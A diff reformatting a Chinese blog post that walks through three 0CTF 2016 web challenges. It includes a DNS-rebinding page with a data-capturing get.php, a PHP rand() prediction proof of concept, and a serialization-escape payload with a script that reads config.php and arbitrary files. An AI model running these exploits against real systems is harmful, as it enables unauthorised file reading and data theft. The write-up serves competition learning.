@@ -1,4 +1,115 @@
-<!DOCTYPE html><html lang="zh-CN"><head><meta charset="utf-8"><meta http-equiv="X-UA-Compatible" content="chrome=1"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no"><title>0ctf 2016 部分 web writeup - Virink's Blog</title><meta name="author" content="Virink"><meta name="keywords" content="PHP,CODE,AUDIT,CTF,Writeup,Sec,Virink,代码审计,技术博客,writeups,ctf"><meta name="description" content="Virink的小站,记录杂文与分享一些技术文章"><link href="/static/css/default.min.css" rel="stylesheet"><link rel="icon" type="image/x-icon" href="/static/img/favicon.ico"><link rel="icon" href="/static/img/favicon.ico"><link rel="alternate" href="/atom.xml" title="Virink's Blog" type="application/atom+xml"><script src="//cdn.bootcss.com/jquery/3.3.1/jquery.min.js"></script></head><body><div class="wrapper"><header><div class="header"><img src="/static/img/logo.png" alt="Virink's Blog logo"><p><a href="/" class="title">Virink's Blog</a></p><p class="subtitle">Let life be beautiful like summer flowers, and death like autume leaves.</p></div><div class="social"><li class="social__item"><a href="https://www.virzz.comatom.xml" title="Virink's RSS"><i class="fa fa-rss"></i> <span class="label">RSS</span></a></li><li class="social__item"><a href="https://github.com/virink" title="Virink's GitHub"><i class="fa fa-github"></i> <span class="label">GitHub</span></a></li><li class="social__item"><a href="https://twitter.com/virinkz" title="Virink's Twitter"><i class="fa fa-twitter"></i> <span class="label">Twitter</span></a></li><li class="social__item"><a href="https://telegram.me/virink" title="Virink's Telegram"><i class="fa fa-paper-plane"></i> <span class="label">Telegram</span></a></li></div><div class="divider__50"></div><nav><li><a href="/">首页</a></li><li><a href="/tags">标签</a></li><li><a href="/archives">归档</a></li><li><a href="/about">关于</a></li><li><a href="/links">友链</a></li></nav></header><div class="divider__70"></div><div class="content"><div class="content-wrap"><article class="article animated fadeIn"><div class="article-title"><i class="fa fa-book"></i>&nbsp;<a href="/2016/03/14/some_web_writeup_for_0ctf_2016.html">0ctf 2016 部分 web writeup</a></div><div class="article-tag"><div class="article-tag-item"><a href="/tags/writeups/"><i class="fa fa-tag"></i>writeups</a></div><div class="article-tag-item"><a href="/tags/ctf/"><i class="fa fa-tag"></i>ctf</a></div></div><div class="article-meta"><div class="article-date"><i class="fa fa-calendar"></i>&nbsp;<time datetime="2016-03-14 06:49:32">2016-03-14 06:49:32</time></div></div><section class="article-content markdown-body"><h2>monkey</h2><p>折腾最久就是这道题了，表示很无奈、、脑洞居然是DNS解析、、、给老外的送分题啊</p><p><a href="http://www.cloudxns.net/" title="http://www.cloudxns.net/">域名解析商</a></p><p>根据页面提示 <strong>$str so that (substr(md5($str), 0, 6) === &#39;c1da58&#39;)</strong>，果断跑数字，成功爆破，最后确定为7-9位左右</p><p>再根据提示<strong>What is Same Origin Policy?</strong>，明显的同源策略</p><p>先来一发ajax获取数据：</p><h3>js.php or js.html</h3><pre><code>&lt;script src=&quot;jquery.min.js&quot;&gt;&lt;/script&gt;
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="chrome=1">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+  <title>0ctf 2016 部分 web writeup - Virink's Blog</title>
+  <meta name="author" content="Virink">
+  <meta name="keywords" content="PHP,CODE,AUDIT,CTF,Writeup,Sec,Virink,代码审计,技术博客,writeups,ctf">
+  <meta name="description" content="Virink的小站,记录杂文与分享一些技术文章">
+  <!-- css files -->
+  <link href="/static/css/default.min.css" rel="stylesheet">
+  
+  <!-- favicon icon files -->
+  <link rel="icon" type="image/x-icon" href="/static/img/favicon.ico">
+  <link rel="icon" href="/static/img/favicon.ico">
+  <!-- rss atom file -->
+  <link rel="alternate" href="/atom.xml" title="Virink's Blog" type="application/atom+xml">
+  <script src="//cdn.bootcss.com/jquery/3.3.1/jquery.min.js"></script>
+  <!-- Chrome 食用最佳，本主题于Chrome下开发，不适配其他浏览器 -->
+</head>
+<body>
+  <div class="wrapper">
+    <header>
+      <div class="header">
+        <img src="/static/img/logo.png" alt="Virink's Blog logo" />
+        <p ><a href="/" class="title">Virink's Blog</a></p>
+        <p class="subtitle">Let life be beautiful like summer flowers, and death like autume leaves.</p>
+      </div>
+      <!-- Social -->
+      <!-- Social -->
+<div class="social">
+  <!-- RSS Atom -->
+  <li class="social__item">
+    <a href="https://www.virzz.comatom.xml" title="Virink's RSS">
+      <i class='fa fa-rss'></i>
+      <span class="label">RSS</span>
+    </a>
+  </li><!-- Github -->
+  <li class="social__item">
+    <a href="https://github.com/virink" title="Virink's GitHub">
+      <i class='fa fa-github'></i>
+      <span class="label">GitHub</span>
+    </a>
+  </li><!-- Twitter -->
+  <li class="social__item">
+    <a href="https://twitter.com/virinkz" title="Virink's Twitter">
+      <i class='fa fa-twitter'></i>
+      <span class="label">Twitter</span>
+    </a>
+  </li><!-- Telegram -->
+  <li class="social__item">
+    <a href="https://telegram.me/virink" title="Virink's Telegram">
+      <i class='fa fa-paper-plane'></i>
+      <span class="label">Telegram</span>
+    </a>
+  </li></div>
+      <div class="divider__50"></div>
+      <!-- Nav -->
+      <nav>
+          <li><a href="/">首页</a></li>
+          <li><a href="/tags">标签</a></li>
+          <li><a href="/archives">归档</a></li>
+          <li><a href="/about">关于</a></li>
+          <li><a href="/links">友链</a></li>
+      </nav>
+    </header>
+
+    <div class="divider__70"></div>
+
+    <!-- Main panel -->
+    <div class="content">
+    
+    <div class="content-wrap">
+        <article class="article animated fadeIn">
+            <div class="article-title">
+                <i class="fa fa-book"></i>&nbsp;<a href="/2016/03/14/some_web_writeup_for_0ctf_2016.html">0ctf 2016 部分 web writeup</a>
+            </div>
+            <div class="article-tag">
+                
+                <div class="article-tag-item">
+                    <a href="/tags/writeups/"><i class="fa fa-tag"></i>writeups</a>
+                </div>
+                
+                <div class="article-tag-item">
+                    <a href="/tags/ctf/"><i class="fa fa-tag"></i>ctf</a>
+                </div>
+                
+            </div>
+            <div class="article-meta">
+                <div class="article-date">
+                    <i class="fa fa-calendar"></i>&nbsp;<time datetime="2016-03-14 06:49:32">2016-03-14 06:49:32</time>
+                </div>
+            </div>
+            <!-- <div class="clearfix"></div> -->
+            <section class="article-content markdown-body">
+                <h2>monkey</h2>
+
+<p>折腾最久就是这道题了，表示很无奈、、脑洞居然是DNS解析、、、给老外的送分题啊</p>
+
+<p><a href="http://www.cloudxns.net/" title="http://www.cloudxns.net/">域名解析商</a></p>
+
+<p>根据页面提示 <strong>$str so that (substr(md5($str), 0, 6) === &#39;c1da58&#39;)</strong>，果断跑数字，成功爆破，最后确定为7-9位左右</p>
+
+<p>再根据提示<strong>What is Same Origin Policy?</strong>，明显的同源策略</p>
+
+<p>先来一发ajax获取数据：</p>
+
+<h3>js.php or js.html</h3>
+
+<pre><code>&lt;script src=&quot;jquery.min.js&quot;&gt;&lt;/script&gt;
 &lt;script&gt;
 function getdata(){
     $.ajax({
@@ -15,7 +126,11 @@ function getdata(){
 }
 getdata();
 &lt;/script&gt;
-</code></pre><p>再来一发get.php:</p><pre><code>&lt;?php
+</code></pre>
+
+<p>再来一发get.php:</p>
+
+<pre><code>&lt;?php
     $data = &quot;get : &quot;.urldecode(urldecode($_SERVER[&#39;QUERY_STRING&#39;]));
     $data .= &quot;\r\npost : &quot;.urldecode(urldecode(file_get_contents(&quot;php://input&quot;)));
     $data .= &quot;\r\nip : &quot;.$_SERVER[&quot;REMOTE_ADDR&quot;];
@@ -27,7 +142,13 @@ getdata();
         file_put_contents(&quot;get.txt&quot;,&quot;### &quot;.date(&quot;Y-m-d H:m:s&quot;).&quot; ###\r\n&quot;.$data.&quot;\r\n&quot;, FILE_APPEND);
     }
 ?&gt;
-</code></pre><p>最后来一发自动爆破并提交的py：</p><h3>monkey_poc.py</h3><pre><code>#!/bin/env python
+</code></pre>
+
+<p>最后来一发自动爆破并提交的py：</p>
+
+<h3>monkey_poc.py</h3>
+
+<pre><code>#!/bin/env python
 #-*- encoding: utf-8 -*-
 
 import md5
@@ -65,7 +186,21 @@ if __name__ == &#39;__main__&#39;:
         i = i-1
         time.sleep(1)
     print &#39;end&#39;
-</code></pre><p>拿起你的域名、、、找一个牛X的dns解析提供商</p><p>运行poc后，根据提示把域名A记录改为127.0.0.1</p><p>你的js.php或者js.html需要放在8080端口哦、、、Orz</p><p>拼手速+网速的时候到了</p><h2>rand_2</h2><p>题目源码</p><pre><code>&lt;?php
+</code></pre>
+
+<p>拿起你的域名、、、找一个牛X的dns解析提供商</p>
+
+<p>运行poc后，根据提示把域名A记录改为127.0.0.1</p>
+
+<p>你的js.php或者js.html需要放在8080端口哦、、、Orz</p>
+
+<p>拼手速+网速的时候到了</p>
+
+<h2>rand_2</h2>
+
+<p>题目源码</p>
+
+<pre><code>&lt;?php
 include(&#39;config.php&#39;);
 session_start();
 
@@ -97,7 +232,19 @@ if (isset($_GET[&#39;go&#39;])) {
 } else {
     show_source(__FILE__);
 }
-</code></pre><p>由于<strong>$<em>GET[&#39;check&#39;] === $</em>SESSION[&#39;rand&#39;]</strong>是<strong>===全等类型</strong>判断，目测无法绕过、脑洞必然在rand()</p><p>这方面没怎么研究、完全现学现卖、、疯狂地百度</p><p>参考文章 ： <a href="http://www.cnblogs.com/wgbs25673578/p/4873269.html" title="随机数产生原理">随机数产生原理</a></p><p>队友写的POC</p><h3>rand<em>2</em>poc.py</h3><pre><code>#!/bin/env python
+</code></pre>
+
+<p>由于<strong>$<em>GET[&#39;check&#39;] === $</em>SESSION[&#39;rand&#39;]</strong>是<strong>===全等类型</strong>判断，目测无法绕过、脑洞必然在rand()</p>
+
+<p>这方面没怎么研究、完全现学现卖、、疯狂地百度</p>
+
+<p>参考文章 ： <a href="http://www.cnblogs.com/wgbs25673578/p/4873269.html" title="随机数产生原理">随机数产生原理</a></p>
+
+<p>队友写的POC</p>
+
+<h3>rand<em>2</em>poc.py</h3>
+
+<pre><code>#!/bin/env python
 #-*- encoding: utf-8 -*-
 
 import requests
@@ -126,7 +273,19 @@ while True:
     if &#39;die&#39; not in response.content:
         print response.content
         break
-</code></pre><h2>piapiapia</h2><p>下载源码、通读一遍。</p><p>大概可以知道这题的脑洞在于是更新个人资料。</p><p>并且，<strong>flag是在config.php中！</strong></p><p>在class.php中可以看到filter()过滤函数，update_profile()更新profile函数</p><pre><code>public function filter($string) {
+</code></pre>
+
+<h2>piapiapia</h2>
+
+<p>下载源码、通读一遍。</p>
+
+<p>大概可以知道这题的脑洞在于是更新个人资料。</p>
+
+<p>并且，<strong>flag是在config.php中！</strong></p>
+
+<p>在class.php中可以看到filter()过滤函数，update_profile()更新profile函数</p>
+
+<pre><code>public function filter($string) {
     $escape = array(&#39;\&#39;&#39;, &#39;\\\\&#39;);
     $escape = &#39;/&#39; . implode(&#39;|&#39;, $escape) . &#39;/&#39;;
     $string = preg_replace($escape, &#39;_&#39;, $string);
@@ -134,28 +293,90 @@ while True:
     $safe = &#39;/&#39; . implode(&#39;|&#39;, $safe) . &#39;/i&#39;;
     return preg_replace($safe, &#39;hacker&#39;, $string);
 }
-</code></pre><p><strong>可以知道&#39;和\被替换成_，以及select、insert、update、delete和where被替换成hacker。</strong></p><pre><code>public function update_profile($username, $new_profile) {
+</code></pre>
+
+<p><strong>可以知道&#39;和\被替换成_，以及select、insert、update、delete和where被替换成hacker。</strong></p>
+
+<pre><code>public function update_profile($username, $new_profile) {
     $username = parent::filter($username);
     $new_profile = parent::filter($new_profile);
     $where = &quot;username = &#39;$username&#39;&quot;;
     return parent::update($this-&gt;table, &#39;profile&#39;, $new_profile, $where);
 }
-</code></pre><p><strong>所更新的资料都是被filter()过滤后的。</strong></p><p>在update.php中</p><pre><code>$user-&gt;update_profile($username, serialize($profile));
-</code></pre><p><strong>更新的profile是警告序列化转换的。</strong></p><p>再往上看，用户输入的数据都是经过正则验证的，然而其中有这样一段代码</p><pre><code>if(preg_match(&#39;/[^a-zA-Z0-9_]/&#39;, $_POST[&#39;nickname&#39;]) || strlen($_POST[&#39;nickname&#39;]) &gt; 10){
+</code></pre>
+
+<p><strong>所更新的资料都是被filter()过滤后的。</strong></p>
+
+<p>在update.php中</p>
+
+<pre><code>$user-&gt;update_profile($username, serialize($profile));
+</code></pre>
+
+<p><strong>更新的profile是警告序列化转换的。</strong></p>
+
+<p>再往上看，用户输入的数据都是经过正则验证的，然而其中有这样一段代码</p>
+
+<pre><code>if(preg_match(&#39;/[^a-zA-Z0-9_]/&#39;, $_POST[&#39;nickname&#39;]) || strlen($_POST[&#39;nickname&#39;]) &gt; 10){
     die(&#39;Invalid nickname&#39;);
 }
-</code></pre><p>明显和另外两个变量，email和photo不同、此处必定是脑洞！！！</p><pre><code>int preg_match ( string $pattern , string $subject [, array &amp;$matches [, int $flags = 0 [, int $offset = 0 ]]] )
+</code></pre>
+
+<p>明显和另外两个变量，email和photo不同、此处必定是脑洞！！！</p>
+
+<pre><code>int preg_match ( string $pattern , string $subject [, array &amp;$matches [, int $flags = 0 [, int $offset = 0 ]]] )
 返回值
 preg_match()返回 pattern 的匹配次数。   它的值将是0次（不匹配）或1次，因为preg_match()在第一次匹配后 将会停止搜索。
 如果发生错误preg_match()返回 FALSE。
-</code></pre><p><strong>如果发生错误preg_match()返回 FALSE。</strong></p><p>当我们输入数组的时候，必定会导致preg_match()返回FALSE，同时让数组长度&lt;10的很简单的，即可以提交<strong>nickname[]=playload</strong></p><p>我们提交nickname[]=xxx可以得到序列化语句：</p><pre><code>a:4:{s:5:&quot;phone&quot;;s:11:&quot;12345678901&quot;;s:5:&quot;email&quot;;s:17:&quot;email@email.email&quot;;s:8:&quot;nickname&quot;;a:1:{i:0;s:3:&quot;xxx&quot;;}s:5:&quot;photo&quot;;s:39:&quot;upload/0cc175b9c0f1b6a831c399e269772661&quot;;}
-</code></pre><p>根据PHP <strong>unserialize()</strong>的特性（<em>这个是测试出来的</em>），解序列化一个完整序列化语句之后的字符串是会被无视掉的。例如：</p><pre><code>unserialize(&#39;a:1:{s:5:&quot;phone&quot;;s:11:&quot;12345678901&quot;;}&#39;)
-</code></pre><p>等价于</p><pre><code>unserialize(&#39;a:1:{s:5:&quot;phone&quot;;s:11:&quot;12345678901&quot;;}xxxxxxxxxxxxxxxx&#39;)
-</code></pre><p>所以、我们可以构造一个特殊的序列化语句，伪造一个photo路径，就像这样：</p><pre><code>a:4:{s:5:&quot;phone&quot;;s:11:&quot;12345678901&quot;;s:5:&quot;email&quot;;s:17:&quot;email@email.email&quot;;s:8:&quot;nickname&quot;;a:1:{i:0;s:3:&quot;xxx&quot;;}s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;}s:5:&quot;photo&quot;;s:39:&quot;upload/0cc175b9c0f1b6a831c399e269772661&quot;;}
-</code></pre><p>但是，我们提交的nickname[]=xxx&quot;;}s:5:&quot;photo&quot;;s:10:&quot;config.php的时候，却是会得到：</p><pre><code>a:4:{s:5:&quot;phone&quot;;s:11:&quot;12345678901&quot;;s:5:&quot;email&quot;;s:17:&quot;email@email.email&quot;;s:8:&quot;nickname&quot;;a:1:{i:0;s:34:&quot;xxx&quot;;}s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;}s:5:&quot;photo&quot;;s:39:&quot;upload/0cc175b9c0f1b6a831c399e269772661&quot;;}
-</code></pre><p>即</p><pre><code>a:1:{i:0;s:34:&quot;xxx&quot;;}s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;}
-</code></pre><p>我们需要逃逸<strong>&quot;;}s:5:&quot;photo&quot;;s:10:&quot;config.php</strong>这31个字符</p><p>这时、猛然发现filter()中，把where替换成hacker明显逃逸了一个字符。。。。。脑洞完全暴露</p><p>当 &#39;where&#39;<em>n+&#39;&quot;;}s:5:&quot;photo&quot;;s:10:&quot;config.php&#39; == &#39;hacker&#39;</em>n 的时候，就可以成功逃逸</p><p>得到playload：</p><pre><code>wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere&quot;;}s:5:&quot;photo&quot;;s:10:&quot;config.php
-</code></pre><h3>piapiapia_poc.py</h3><pre><code>#!/bin/env python
+</code></pre>
+
+<p><strong>如果发生错误preg_match()返回 FALSE。</strong></p>
+
+<p>当我们输入数组的时候，必定会导致preg_match()返回FALSE，同时让数组长度&lt;10的很简单的，即可以提交<strong>nickname[]=playload</strong></p>
+
+<p>我们提交nickname[]=xxx可以得到序列化语句：</p>
+
+<pre><code>a:4:{s:5:&quot;phone&quot;;s:11:&quot;12345678901&quot;;s:5:&quot;email&quot;;s:17:&quot;email@email.email&quot;;s:8:&quot;nickname&quot;;a:1:{i:0;s:3:&quot;xxx&quot;;}s:5:&quot;photo&quot;;s:39:&quot;upload/0cc175b9c0f1b6a831c399e269772661&quot;;}
+</code></pre>
+
+<p>根据PHP <strong>unserialize()</strong>的特性（<em>这个是测试出来的</em>），解序列化一个完整序列化语句之后的字符串是会被无视掉的。例如：</p>
+
+<pre><code>unserialize(&#39;a:1:{s:5:&quot;phone&quot;;s:11:&quot;12345678901&quot;;}&#39;)
+</code></pre>
+
+<p>等价于</p>
+
+<pre><code>unserialize(&#39;a:1:{s:5:&quot;phone&quot;;s:11:&quot;12345678901&quot;;}xxxxxxxxxxxxxxxx&#39;)
+</code></pre>
+
+<p>所以、我们可以构造一个特殊的序列化语句，伪造一个photo路径，就像这样：</p>
+
+<pre><code>a:4:{s:5:&quot;phone&quot;;s:11:&quot;12345678901&quot;;s:5:&quot;email&quot;;s:17:&quot;email@email.email&quot;;s:8:&quot;nickname&quot;;a:1:{i:0;s:3:&quot;xxx&quot;;}s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;}s:5:&quot;photo&quot;;s:39:&quot;upload/0cc175b9c0f1b6a831c399e269772661&quot;;}
+</code></pre>
+
+<p>但是，我们提交的nickname[]=xxx&quot;;}s:5:&quot;photo&quot;;s:10:&quot;config.php的时候，却是会得到：</p>
+
+<pre><code>a:4:{s:5:&quot;phone&quot;;s:11:&quot;12345678901&quot;;s:5:&quot;email&quot;;s:17:&quot;email@email.email&quot;;s:8:&quot;nickname&quot;;a:1:{i:0;s:34:&quot;xxx&quot;;}s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;}s:5:&quot;photo&quot;;s:39:&quot;upload/0cc175b9c0f1b6a831c399e269772661&quot;;}
+</code></pre>
+
+<p>即</p>
+
+<pre><code>a:1:{i:0;s:34:&quot;xxx&quot;;}s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;}
+</code></pre>
+
+<p>我们需要逃逸<strong>&quot;;}s:5:&quot;photo&quot;;s:10:&quot;config.php</strong>这31个字符</p>
+
+<p>这时、猛然发现filter()中，把where替换成hacker明显逃逸了一个字符。。。。。脑洞完全暴露</p>
+
+<p>当 &#39;where&#39;<em>n+&#39;&quot;;}s:5:&quot;photo&quot;;s:10:&quot;config.php&#39; == &#39;hacker&#39;</em>n 的时候，就可以成功逃逸</p>
+
+<p>得到playload：</p>
+
+<pre><code>wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere&quot;;}s:5:&quot;photo&quot;;s:10:&quot;config.php
+</code></pre>
+
+<h3>piapiapia_poc.py</h3>
+
+<pre><code>#!/bin/env python
 #-*- encoding: utf-8 -*-
 
 def getflag():
@@ -193,4 +414,79 @@ if __name__ == &#39;__main__&#39;:
     getpasswd()
     f = raw_input(&quot;Input filepath what your want to read:&quot;)
     getany(f)
-</code></pre></section><div class="article-copyright"><span>本文标题&nbsp;:&nbsp;</span><a href="/2016/03/14/some_web_writeup_for_0ctf_2016.html" target="_blank">0ctf 2016 部分 web writeup</a><br><span>文章作者&nbsp;:&nbsp;</span><a href="https://www.virzz.com" target="_blank">Virink</a><br><span>发布时间&nbsp;:&nbsp;</span><i class="fa fa-calendar"></i>&nbsp;<time datetime="2016-03-14 06:49:32">2016-03-14 06:49:32</time><br><span>最后更新&nbsp;:&nbsp;</span><i class="fa fa-calendar"></i>&nbsp;<time datetime="2017-06-01 23:24:53">2017-06-01 23:24:53</time><br><span>本文链接&nbsp;:&nbsp;</span><a href="https://www.virzz.com/2016/03/14/some_web_writeup_for_0ctf_2016.html" title="0ctf 2016 部分 web writeup" target="_blank">https://www.virzz.com/2016/03/14/some_web_writeup_for_0ctf_2016.html</a><br><span>转载声明&nbsp;:&nbsp;</span><i class="fa fa-creative-commons"></i>转载请保留原文链接及作者。<br><span>转载说明&nbsp;:&nbsp;</span><i class="fa fa-exclamation-circle"></i>本卡片有模板生成，本人转载来的文章请忽略~~</div></article><div class="toc" data-toc="h2" data-toccontainer="section"></div></div></div><div class="divider__70"></div><footer class="footer"><center><span class="footer__copyright">&copy; 2017-2018. | ❤ <a href="mailto:virink@outlook.com">Virink </a>| 由 <a href="https://github.com/virink/MweBlog">MWEBLOG</a> 强力驱动 | 主题<a href="https://github.com/virink/MweBlog">default</a></span> <span>本站採用<i class="fa fa-creative-commons"></i><a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" title="CC BY-NC-SA 4.0 International" target="_blank">"知识共享 署名-非商业性使用-禁止演绎 4.0 国际 许可协议"</a></span></center></footer></div><script>!window.jQuery&&document.write(unescape('%3Cscript src="/script/js/jquery.min.js"%3E%3C/script%3E'))</script><script src="/static/js/hackrain.js"></script><script>$(document).ready(function(){hackrain()})</script><script src="//cdn.bootcss.com/mathjax/2.7.2/MathJax.js"></script><script src="//cdn.bootcss.com/highlight.js/9.12.0/highlight.min.js"></script><script src="//cdn.bootcss.com/github-repo-widget/e23d85ab8f/jquery.githubRepoWidget.min.js"></script><script src="/static/js/toc.min.js"></script><script>$(document).ready(function(){$("code").each(function(t,a){hljs.highlightBlock(a)}),MathJax.Hub.Config({tex2jax:{inlineMath:[["[latex]","[/latex]"],["\\(","\\)"]]}})})</script><script async src="https://www.googletagmanager.com/gtag/js?id=UA-83885261-1"></script><script>function gtag(){dataLayer.push(arguments)}window.dataLayer=window.dataLayer||[],gtag("js",new Date),gtag("config","UA-83885261-1")</script><script>var _hmt=_hmt||[];!function(){var e=document.createElement("script");e.src="https://hm.baidu.com/hm.js?8e6156c342669e24891a8ed34161d84a";var t=document.getElementsByTagName("script")[0];t.parentNode.insertBefore(e,t)}()</script></body></html>
+</code></pre>
+
+            </section>
+            <div class="article-copyright">
+              <span>本文标题&nbsp;:&nbsp;</span><a href="/2016/03/14/some_web_writeup_for_0ctf_2016.html" target="_blank">0ctf 2016 部分 web writeup</a><br />
+              <span>文章作者&nbsp;:&nbsp;</span><a href="https://www.virzz.com" target="_blank">Virink</a><br />
+              <span>发布时间&nbsp;:&nbsp;</span><i class="fa fa-calendar"></i>&nbsp;<time datetime="2016-03-14 06:49:32">2016-03-14 06:49:32</time><br />
+              <span>最后更新&nbsp;:&nbsp;</span><i class="fa fa-calendar"></i>&nbsp;<time datetime="2017-06-01 23:24:53">2017-06-01 23:24:53</time><br />
+              <span>本文链接&nbsp;:&nbsp;</span><a href="https://www.virzz.com/2016/03/14/some_web_writeup_for_0ctf_2016.html" title="0ctf 2016 部分 web writeup" target="_blank">https://www.virzz.com/2016/03/14/some_web_writeup_for_0ctf_2016.html</a><br />
+              <span>转载声明&nbsp;:&nbsp;</span><i class="fa fa-creative-commons"></i>转载请保留原文链接及作者。<br />
+              <span>转载说明&nbsp;:&nbsp;</span><i class="fa fa-exclamation-circle"></i>本卡片有模板生成，本人转载来的文章请忽略~~
+            </div>
+        </article>
+        <!-- <div class="toc" data-toc="h2,h3,h4,h5,h6"></div> -->
+        <div class="toc" data-toc="h2" data-tocContainer="section"></div>
+    </div>
+
+    </div>
+
+    <div class="divider__70"></div>
+
+    <!-- Footer Panel -->
+    <footer class="footer">
+      <center>
+        <span class="footer__copyright">&copy; 2017-2018. | ❤ <a href="mailto:virink@outlook.com"> Virink </a> | 由 <a href="https://github.com/virink/MweBlog">MWEBLOG</a> 强力驱动 | 主题<a href="https://github.com/virink/MweBlog">default</a></span>
+        <span>本站採用<i class="fa fa-creative-commons"></i><a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" title="CC BY-NC-SA 4.0 International" target="_blank">"知识共享 署名-非商业性使用-禁止演绎 4.0 国际 许可协议"</a></span>
+        </center>
+    </footer>
+
+  </div>
+  <!-- js files -->
+  <script>!window.jQuery && document.write(unescape('%3Cscript src="/script/js/jquery.min.js"%3E%3C/script%3E'))</script>
+  <script src="/static/js/hackrain.js"></script>
+  <script>
+    
+  </script>
+  
+
+<script src="//cdn.bootcss.com/mathjax/2.7.2/MathJax.js"></script>
+<script src="//cdn.bootcss.com/highlight.js/9.12.0/highlight.min.js"></script>
+<script src="//cdn.bootcss.com/github-repo-widget/e23d85ab8f/jquery.githubRepoWidget.min.js"></script>
+<script src="/static/js/toc.min.js"></script>
+<script>
+    $(document).ready(function(){
+        // highlight
+        $('code').each(function(i, block) {
+            hljs.highlightBlock(block);
+        });
+        // MathJax
+        MathJax.Hub.Config({ 
+            tex2jax: {inlineMath: [['[latex]','[/latex]'], ['\\(','\\)']]} 
+        });
+    });
+</script>
+
+  <!-- Analytics Google -->
+<!-- Global site tag (gtag.js) - Google Analytics -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-83885261-1"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+  gtag('config', 'UA-83885261-1');
+</script>
+<!-- Analytics Baidu -->
+<script>
+var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "https://hm.baidu.com/hm.js?8e6156c342669e24891a8ed34161d84a";
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+})();
+</script>
+</body>
+</html>
